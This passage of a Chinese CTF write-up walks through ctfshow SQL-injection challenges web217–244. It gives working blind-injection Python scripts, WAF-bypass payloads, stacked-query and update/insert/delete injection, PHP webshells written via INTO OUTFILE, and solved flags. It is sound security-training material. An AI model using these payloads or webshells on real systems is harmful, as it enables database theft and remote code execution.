\u0026#39;debug\u0026#39;: \u0026#39;0\u0026#39; 26 } 27 try: 28 # 发送POST请求，设置超时时间为1秒 29 r = requests.post(url, data=data, timeout=0.33) 30 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 31 time.sleep(1) 32 tail = mid 33 except requests.exceptions.Timeout: 34 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 35 time.sleep(1) 36 head = mid + 1 37 except Exception as e: 38 time.sleep(1) 39 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 40 break 41 42 if head != 32: 43 # 如果找到有效的字符，将其添加到结果字符串中 44 result += chr(head) 45 else: 46 # 如果没有找到有效字符，退出循环 47 break 48 49 print(\u0026#34;[*]Result : \u0026#34;+result) benchmark的设置比较苛刻，要多试试\n最好不要设置太大，环境会崩\nweb218 1查询语句 2 3 where id = ($id); 4 5返回逻辑 6 7 //屏蔽危险分子 8 function waf($str){ 9 return preg_match(\u0026#39;/sleep|benchmark/i\u0026#39;,$str); 10 } 11 这题sleep和benchmark都被ban掉了\n可以考虑用笛卡尔积盲注\n参考文章：SQL注入经验-大负荷注入-腾讯云开发者社区-腾讯云\n1import requests 2import time 3 4url = \u0026#34;http://a17ea2c9-7463-4d5a-bfa5-2f6bdcd2daf1.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxc\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaac from ctfshow_flagxc\u0026#34; 21 data = { 22 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 23 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 24 } 25 try: 26 # 发送POST请求，设置超时时间为1秒 27 r = requests.post(url, data=data, timeout=0.15) 28 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 29 time.sleep(0.2) 30 tail = mid 31 except requests.exceptions.Timeout: 32 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 33 time.sleep(0.2) 34 head = mid + 1 35 except Exception as e: 36 time.sleep(0.2) 37 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 38 break 39 40 if head != 32: 41 # 如果找到有效的字符，将其添加到结果字符串中 42 result += chr(head) 43 else: 44 # 如果没有找到有效字符，退出循环 45 break 46 47 print(\u0026#34;[*]Result : \u0026#34;+result) 48 49# ctfshow{d317911f-ac1e-4160-be70-47d01a0f2f45} 乱码的话，多跑几次就好了\n另一种方法就是通过正则 DOS RLIKE注入\n利用 SQL 多次计算正则消耗计算资源产生延时效果，与 benchmark 原理类似，通过 rpad 或 repeat 构造长字符串，以计算量大的 pattern。\ndebug=1\u0026amp;ip=repeat(rpad(\u0026#39;a\u0026#39;, 999999, \u0026#39;a\u0026#39;),16) rlike concat(repeat(\u0026#39;(a.*)+\u0026#39;,14), \u0026#39;b\u0026#39;) web219 查询语句\rwhere id = ($id);\r返回逻辑\r//屏蔽危险分子\rfunction waf($str){\rreturn preg_match(\u0026#39;/sleep|benchmark|rlike/i\u0026#39;,$str);\r} 继续使用笛卡尔积盲注即可\n1import requests 2import time 3 4url = \u0026#34;http://61d55d79-847e-43d7-80e4-c221ceae9f4a.challenge.ctf.show/api/\u0026#34; 5result = \u0026#34;\u0026#34; 6i = 0 7 8while True: 9 i = i + 1 10 # ASCII码范围，32到127是可打印字符的范围 11 head = 32 12 tail = 127 13 14 while head \u0026lt; tail: 15 # 二分查找的中间值 16 mid = (head + tail) \u0026gt;\u0026gt; 1 17 18 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxca\u0026#39; limit 1,1\u0026#34; 20 payload = \u0026#34;select flagaabc from ctfshow_flagxca\u0026#34; 21 22 data = { 23 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 24 \u0026#39;debug\u0026#39;: \u0026#39;1\u0026#39; 25 } 26 try: 27 # 发送POST请求，设置超时时间为1秒 28 r = requests.post(url, data=data, timeout=0.15) 29 # 如果请求在1秒内返回，说明当前位置字符的ASCII码小于等于中间值 30 time.sleep(0.2) 31 tail = mid 32 except requests.exceptions.Timeout: 33 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 34 time.sleep(0.2) 35 head = mid + 1 36 except Exception as e: 37 time.sleep(0.2) 38 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 39 break 40 41 if head != 32: 42 # 如果找到有效的字符，将其添加到结果字符串中 43 result += chr(head) 44 else: 45 # 如果没有找到有效字符，退出循环 46 break 47 48 print(\u0026#34;[*]Result : \u0026#34;+result) web220 查询语句\rwhere id = ($id);\r返回逻辑\r//屏蔽危险分子\rfunction waf($str){\rreturn preg_match(\u0026#39;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i\u0026#39;,$str);\r} substr用left代替即可，有点像之前布尔盲注的一道题，只是改成了时间盲注罢了\n1import requests 2import string 3import time 4 5url = \u0026#34;http://52728b9a-ffae-4f96-b51f-0549bb5cb4e0.challenge.ctf.show/api/\u0026#34; 6str=\u0026#34; _{}-\u0026#34; + string.ascii_lowercase + string.digits 7result = \u0026#39;\u0026#39; 8for i in range(1,45): 9 for j in str: 10 # payload = \u0026#34;select table_name from information_schema.tables where table_schema=database() limit 0,1\u0026#34; 11 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flagxcac\u0026#39; limit 1,1\u0026#34; 12 payload = \u0026#34;select flagaabcc from ctfshow_flagxcac\u0026#34; 13 14 data = { 15 \u0026#39;ip\u0026#39;: f\u0026#34;1) or if(LEFT(({payload}),{i})regexp(\u0026#39;{result+j}\u0026#39;),(select count(*) from information_schema.columns A, information_schema.columns B),1)#\u0026#34;, 16 \u0026#39;debug\u0026#39;: 0 17 } 18 try: 19 r = requests.post(url, data=data, timeout=0.15) 20 time.sleep(0.2) 21 except Exception as e: 22 time.sleep(0.2) 23 result = result + j 24 print(\u0026#34;[*] loading :\u0026#34;+result) 25 break 26 27print(\u0026#34;[*] result :\u0026#34;+result) web221 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//拿到数据库名字就算你赢 p神的文章有提到limit注入\n[转载]Mysql下Limit注入方法 | 离别歌\npayload:\n?page=1\u0026amp;limit=1%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1) group注入 web222 查询语句\r//分页查询\r$sql = select * from ctfshow_user group by $username;\r返回逻辑\r//TODO:很安全，不需要过滤 group by 可以进行时间盲注，布尔盲注等\n本来以为是报错注入的，发现好像不太行\n还是的时间盲注\n拿前面的盲注脚本改一改\n1import requests 2import time 3url = \u0026#34;http://529d9311-c036-4831-bfa1-b2ca91dae190.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7while True: 8 i = i + 1 9 # ASCII码范围，32到127是可打印字符的范围 10 head = 32 11 tail = 127 12 13 while head \u0026lt; tail: 14 # 二分查找的中间值 15 mid = (head + tail) \u0026gt;\u0026gt; 1 16 # 查表名 17 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 18 # 查列名字 19 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;ctfshow_flaga\u0026#39; limit 1,1\u0026#34; 20 # 爆字段 21 payload = \u0026#34;select flagaabc from ctfshow_flaga\u0026#34; 22 23 data = f\u0026#34;concat((if (ascii(substr(({payload}),{i},1))\u0026gt;{mid}, sleep(0.05), 2)), 1);\u0026#34; 24 25 try: 26 r = requests.post(url+data, timeout=0.05) 27 time.sleep(0.2) 28 tail = mid 29 except requests.exceptions.Timeout: 30 time.sleep(0.2) 31 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 32 head = mid + 1 33 except Exception as e: 34 time.sleep(0.2) 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web223 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user group by $username; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//用户名不能是数字 这题ban掉了数字\n用true来构造出数字即可\n这题一开始我想用时间盲注的，但是跑不出来，后面直接拿y4✌的布尔盲注跑了\n如下\n1import requests 2import time 3url = \u0026#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7def createNum(n): 8 num = \u0026#39;true\u0026#39; 9 if n == 1: 10 return \u0026#39;true\u0026#39; 11 else: 12 for i in range(n - 1): 13 num += \u0026#34;+true\u0026#34; 14 return num 15 16while True: 17 i = i + 1 18 # ASCII码范围，32到127是可打印字符的范围 19 head = 32 20 tail = 127 21 22 while head \u0026lt; tail: 23 # 二分查找的中间值 24 mid = (head + tail) \u0026gt;\u0026gt; 1 25 26 # 查数据库-ctfshow_flagas 27 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 28 # 查字段-flagasabc 29 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagas\u0026#39;\u0026#34; 30 # 查flag 31 payload = \u0026#34;select flagasabc from ctfshow_flagas\u0026#34; 32 33 34 params = { 35 # \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},sleep(true),true)\u0026#34; #时间盲注 （我没跑出来，不知道为啥 36 \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},username,\u0026#39;a\u0026#39;)\u0026#34; #布尔盲注 37 } 38 39 # try: 40 # r = requests.post(url,params=params,timeout=1) 41 # tail = mid 42 # except Exception as e: 43 # head = mid + 1 44 45 r = requests.get(url, params=params) 46 if \u0026#34;userAUTO\u0026#34; in r.text: 47 head = mid + 1 48 else: 49 tail = mid 50 51 if head != 32: 52 # 如果找到有效的字符，将其添加到结果字符串中 53 result += chr(head) 54 else: 55 # 如果没有找到有效字符，退出循环 56 break 57 58 print(result) 布尔盲注这么快，我为什么要想不开尝试时间盲注呢\nweb224 试了试万能密码，失败了\n访问/robots.txt\n发现有重置密码的路由\n修改密码之后登入，看到一个文件上传\nctfshow web224 sql_文件上传产生sql注入 详解_sql注入漏洞ctf文件上传-CSDN博客\n这是一道文件上传的sql注入题\n当文件上传时，后台会将文件名，文件路径，文件类型（文件头）直接与sql语句进行拼接\n所以我们可以构造一个恶意文件，将文件头改写成我们要拼接的sql语句，从而实现注入\n如图\npayload:\nC64File \u0026#34;\u0026#39;);select 0x3c3f3d60746163202f662a603f3e into outfile \u0026#39;/var/www/html/1.php\u0026#39;;--+ 新建文本，写入payload，改名为1.bin，上传文件，访问1.bin拿到flag\n堆叠注入 web225 没有过滤show\nusername=1\u0026#39;;show tables; 可以用handler读\npayload:\nusername=ctfshow\u0026#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first; 1.handler ctfshow_flag as a open;\nHANDLER 语句是 MySQL 中用于直接操作表的一种特殊方式。此语句的作用是打开一个名为 ctfshow_flag 的表，并将其别名为 a。HANDLER 语句可以绕过一些常规的查询机制，直接访问表的数据，通常用于高效地获取数据。\n2.handler ctfshow_flag as a read first;\n该语句继续使用 HANDLER 来操作之前打开的 ctfshow_flag 表（别名 a），read first 表示读取表中的第一行数据。\n其他方法\nweb226 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //师傅说过滤的越多越好 9 if(preg_match(\u0026#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(/i\u0026#39;,$username)){ 10 die(json_encode($ret)); 11 } 这道题把show给waf掉了\n这题可以用预处理来打\n[SQL注入][强网杯 2019]随便注(三种姿势)-CSDN博客\n格式\nPREPARE name from \u0026#39;[my sql sequece]\u0026#39;; //预定义SQL语句\rEXECUTE name; //执行预定义SQL语句\r(DEALLOCATE || DROP) PREPARE name; //删除预定义SQL语句 我们可以先将要执行的语句转换成16进制后，作为预处理的sql语句传入，并执行\npayload\nusername=1\u0026#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables;\r//show tables\rusername=1\u0026#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns;\r//select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;ctfsh_ow_flagas\u0026#39;\rusername=1\u0026#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag;\r//select flagasb from ctfsh_ow_flagas\r//ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890} web227 这道题没办法通过查表拿到flag\n这道题的payload是\n1\u0026#39;;call getFlag(); 就是执行getFlag函数拿到flag\n但问题是我们要怎么知道这个函数呢\n我们需要查看MySQL的存储过程，如下文\nMySQL——查看存储过程和函数_mysql 查询function-CSDN博客\nSELECT * FROM information_schema.Routines 通过预处理执行\nusername=1\u0026#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines; 可以看到getFlag函数和flag\nweb228 查询语句\r//分页查询\r$sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r$bansql = \u0026#34;select char from banlist;\u0026#34;;\r返回逻辑\r//师傅说内容太多，就写入数据库保存\rif(count($banlist)\u0026gt;0){\rforeach ($banlist as $char) {\rif(preg_match(\u0026#34;/\u0026#34;.$char.\u0026#34;/i\u0026#34;, $username)){\rdie(json_encode($ret));\r}\r}\r} 同web226\nweb229 同web226\nweb230 同web226\nupdate注入 web231 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤\r知道update函数的作用之后就好理解了\n可以通过update函数更新ctfshow_user表中的内容\n利用update将查询结果写入表中\npassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1 查表名\rpassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1\r查列名\rpassword=1\u0026#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flaga\u0026#39;) where 1=1#\u0026amp;username=1\r得到flag\rpassword=1\u0026#39;,username=(select flagas from flaga) where 1=1#\u0026amp;username=1\r原文链接：https://blog.csdn.net/solitudi/article/details/110144623 web232 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = md5(\u0026#39;{$password}\u0026#39;) where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤 同web231\npassword=1\u0026#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1\rpassword=1\u0026#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flagaa\u0026#39;) where 1=1#\u0026amp;username=1\rpassword=1\u0026#39;),username=(select flagass from flagaa) where 1=1#\u0026amp;username=1 web233 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤 这道题貌似waf掉了单引号，导致无法构造闭合，前面的方法用不了\n方法一 wp看到的骚操作\npayload\n#获取表名\rpassword=\\\u0026amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23\r#获取列名\rpassword=\\\u0026amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23\r#获取数据\rpassword=\\\u0026amp;username=,username=(select group_concat(flagass233) from flag233333) 方法二 ：盲注 1\u0026#34;\u0026#34;\u0026#34; 2Author:Y4tacker 3\u0026#34;\u0026#34;\u0026#34; 4import requests 5 6url = \u0026#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1\u0026amp;limit=10\u0026#34; 7 8result = \u0026#34;\u0026#34; 9i = 0 10 11while 1: 12 i = i + 1 13 head = 32 14 tail = 127 15 16 while head \u0026lt; tail: 17 mid = (head + tail) \u0026gt;\u0026gt; 1 18 # 查数据库 19 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 20 # 查表名 21 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;flag233333\u0026#39; limit 1,1\u0026#34; 22 # 查数据 23 payload = \u0026#34;select flagass233 from flag233333\u0026#34; 24 data = { 25 \u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(0.05),1)#\u0026#34;, 26 \u0026#39;password\u0026#39;: \u0026#39;4\u0026#39; 27 } 28 try: 29 r = requests.post(url, data=data, timeout=0.9) 30 tail = mid 31 except Exception as e: 32 head = mid + 1 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web234 查询语句\r//分页查询\r$sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;;\r返回逻辑\r//无过滤 同web233，用\\实现逃逸\nweb235 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤 or \u0026#39; or \u0026lsquo; 被禁导致information_schema.tables也被禁了\n导致我们没办法查询列\n这种情况涉及到一个知识点 ：CTF|mysql之无列名注入 - 知乎\n在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。\n读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\ 查字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#\u0026amp;password=\\ web236 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤 or \u0026#39; flag 读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\\r//banlist,ctfshow_user,flaga 读字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#\u0026amp;password=\\ 这题新增的flag过滤，但是实际上没有影响，或许是过滤返回的内容？\ninsert注入 web237 1查询语句 2 3 //插入数据 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6返回逻辑 7 8 //无过滤 insert函数用于插入值\n其实跟update注入差不多\npayload:\n读表名\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));# 查列名\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;));#\r//id,flagass23s3,info 爆字段\npassword=1\u0026amp;username=1\u0026#39;,(select flagass23s3 from flag));# web238 1查询语句 2 3 //插入数据 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6返回逻辑 7 8 //过滤空格 测了一下发现不止是空格，连同一些代替空格的字符也被一同waf了，比如/**/\n我们可以考虑用括号代替空格\npayload\n#获取表名\rusername=1\u0026#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23\u0026amp;password=1\r#获取列名\rusername=1\u0026#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flagb\u0026#39;)))%23\u0026amp;password=1\r#获取数据\rusername=1\u0026#39;,(select(group_concat(flag))from(flagb)))%23\u0026amp;password=1 web239 查询语句\r//插入数据\r$sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;;\r返回逻辑\r//过滤空格 or payload:\n读表\nusername=1\u0026#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#\u0026amp;password=1 由于*被ban掉了，没办法用之前无列名爆字段的方法\n这里猜测列名为flag，直接读\nusername=1\u0026#39;,(select(flag)from(flagbb)))#\u0026amp;password=1 web240 Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写 查询语句\r//插入数据\r$sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;;\r返回逻辑\r//过滤空格 or sys mysql 根据hint可以知道是要爆破表名\n拿y4✌的脚本改一下\n\u0026#34;\u0026#34;\u0026#34;\rAuthor:Y4tacker\r\u0026#34;\u0026#34;\u0026#34;\rimport random\rimport requests\rurl = \u0026#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show\u0026#34;\rurl_insert = url + \u0026#34;/api/insert.php\u0026#34;\rurl_flag = url + \u0026#34;/api/?page=1\u0026amp;limit=1000\u0026#34;\r# 看命函数\rdef generate_random_str():\rsttr = \u0026#39;ab\u0026#39;\rstr_list = [random.choice(sttr) for i in range(5)]\rrandom_str = \u0026#39;\u0026#39;.join(str_list)\rreturn random_str\rwhile 1:\rdata = {\r\u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39;,(select(flag)from(flag{generate_random_str()})))#\u0026#34;,\r\u0026#39;password\u0026#39;: \u0026#34;\u0026#34;\r}\rr = requests.post(url_insert, data=data)\rr2 = requests.get(url_flag)\rif \u0026#34;ctfshow{\u0026#34; in r2.text:\rfor i in r2.json()[\u0026#39;data\u0026#39;]:\rif \u0026#34;ctfshow{\u0026#34; in i[\u0026#39;pass\u0026#39;]:\rprint(i[\u0026#39;pass\u0026#39;])\rbreak\rbreak web241 sql语句\r//删除记录\r$sql = \u0026#34;delete from ctfshow_user where id = {$id}\u0026#34;;\r返回逻辑\r//无过滤 delete注入，delete函数顾名思义就是从数据库中删除内容\n注入点在where后面，可以采用时间盲注或者布尔盲注，但是由于delete会删除数据库中的记录，所以可能会出现记录都删完了但是flag还没注出来的情况\n1import requests 2import time 3url = \u0026#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php\u0026#39; 4str = \u0026#39;\u0026#39; 5for i in range(1, 60): 6 min,max = 32, 128 7 while True: 8 j = min + (max-min)//2 9 if(min == j): 10 str += chr(j) 11 print(str) 12 break 13 # 爆表名 14 # payload = { 15 # \u0026#39;id\u0026#39;: f\u0026#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#39; 16 # } 17 # 爆列 18 # payload = { 19 # \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 20 # } 21 # 爆值 22 payload = { 23 \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(flag) from flag),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 24 } 25 start_time = time.time() 26 r = requests.post(url=url, data=payload).text 27 end_time = time.time() 28 sub = end_time - start_time 29 if sub \u0026gt;= 0.2: 30 max = j 31 else: 32 min = j 为什么sleep设定的是0.03，但是超时时间是大于0.2呢\n那是因为要对所有记录都算一遍 if\n那我们怎么测试这个时间呢，这里放一个大佬的脚本\nPractice - CTFSHOW WEB入门 SQL注入篇\nurl = \u0026#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php\u0026#39;\rdef test2() -\u0026gt; float:\rrand = random.random()\rtime_s = time.time()\r_ = requests.post(url,data={\u0026#34;id\u0026#34;: f\u0026#34;if({1 if rand \u0026gt; 0.5 else 0},sleep(0.05),0)\u0026#34;})\rtime_e = time.time()\rreturn (rand \u0026gt; 0.5, time_e - time_s)\rprint([test() for _ in range(30)]) 我测出来的结果\n[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)] 在false和true之间选取一个合适的值即可，目的是能够进行区分，我这里选取了0.2\n文件注入 web242 1sql语句 2 3 //备份表 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 outfile的语法\rSELECT ... INTO OUTFILE \u0026#39;file_name\u0026#39;\r[CHARACTER SET charset_name]\r[export_options]\rexport_options:\r[{FIELDS | COLUMNS}\r[TERMINATED BY \u0026#39;string\u0026#39;]//分隔符\r[[OPTIONALLY] ENCLOSED BY \u0026#39;char\u0026#39;]\r[ESCAPED BY \u0026#39;char\u0026#39;]\r]\r[LINES\r[STARTING BY \u0026#39;string\u0026#39;]\r[TERMINATED BY \u0026#39;string\u0026#39;]\r]\r----------------------------------------------------\r“OPTION”参数为可选参数选项，其可能的取值有：\rFIELDS TERMINATED BY \u0026#39;字符串\u0026#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。\rFIELDS ENCLOSED BY \u0026#39;字符\u0026#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。\rFIELDS OPTIONALLY ENCLOSED BY \u0026#39;字符\u0026#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。\rFIELDS ESCAPED BY \u0026#39;字符\u0026#39;：设置转义字符，只能为单个字符。默认值为“\\”。\rLINES STARTING BY \u0026#39;字符串\u0026#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。\rLINES TERMINATED BY \u0026#39;字符串\u0026#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。 漏洞的注入点是由于数据库的导出功能\n根据这个我们可以写入一句话木马\npayload:\nfilename=1.php\u0026#39; LINES STARTING BY \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;# web243 1sql语句 2 3 //备份表 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤了php 尝试一下.user.ini文件包含\nfilename=.user.ini\u0026#39; lines starting by \u0026#39;auto_prepend_file=1.txt\\n\u0026#39;%23\rfilename=1.txt\u0026#39; lines starting by \u0026#39;\u0026lt;?=eval($_POST[1])?\u0026gt;\u0026#39;%23 报错注入 新手小白入门——SQL注入之报错注入_sql注入报错注入-CSDN博客\nweb244 sql语句\r//备份表\r$sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;;\r返回逻辑\r//无过滤 updatexml报错注入\npayload\n/api/?id=\u0026#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23\r/api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 